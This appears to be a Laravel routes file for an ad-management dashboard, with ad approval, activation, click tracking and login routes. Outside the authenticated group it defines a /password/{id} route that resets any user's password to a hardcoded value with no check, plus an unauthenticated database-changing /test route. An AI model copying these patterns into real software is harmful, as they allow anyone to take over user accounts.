<?php

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It's a breeze. Simply tell Laravel the URIs it should respond to
| and give it the Closure to execute when that URI is requested.
|
*/

Route::get('/', function () {
    if (Auth::check()) {
        return View::make('dashboard');
    }
    return View::make('login');
});

Route::get('/test', function () {
    $ads                    = Ad::where('scheduled', '1')->get();
    $time               = time();
    $activated      = 0;
    $deactivated    = 0;

    foreach ($ads as $ad) {
            $ad->start  = date("D M d Y", $ad->start_time);
            $ad->end        = date("D M d Y", $ad->end_time);
            $ad->save();
    }
    return 'Done';
});

// Checks the user is logged in
Route::group(['before' => 'auth'], function () {
    Route::resource('ads', 'AdController');
    Route::get('/archived', 'AdController@archived');
    Route::get('ads/{id}/approve', 'AdController@approve');
    Route::get('ads/{id}/unapprove', 'AdController@unapprove');
    Route::get('ads/{id}/activate', 'AdController@activate');
    Route::get('ads/{id}/deactivate', 'AdController@deactivate');
    Route::get('ads/{id}/hide-homepage', 'AdController@homehide');
    Route::get('ads/{id}/show-homepage', 'AdController@homeshow');
    Route::get('ads/{id}/hide-inside', 'AdController@insidehide');
    Route::get('ads/{id}/show-inside', 'AdController@insideshow');
    Route::get('ads/{id}/archive', 'AdController@archive');
    Route::get('ads/{id}/restore', 'AdController@restore');
    Route::get('ads/{id}/update', 'AdController@update');
});

Route::get('/scheduler', 'AdController@scheduler');

Route::get('/click/{id}', function ($id) {

    // Logs click to database
    $ad                 = Ad::find($id);
    $clicks         = $ad->clicks + 1;
    $ad->clicks = $clicks;
    $ad->save();

    //Redirects user to link
    return Redirect::to($ad->link);
});


Route::get('/password/{id}', function ($id) {

    // Logs click to database
    $user                   = User::find($id);
    $user->password = Hash::make('w1ndf@11');
    $user->save();

    //Redirects user to link
    return Redirect::to('/')->with('message', 'Success');
});

// Authentication Routes
Route::resource('sessions', 'SessionsController');
Route::get('login', 'SessionsController@create');
Route::get('logout', 'SessionsController@destroy');
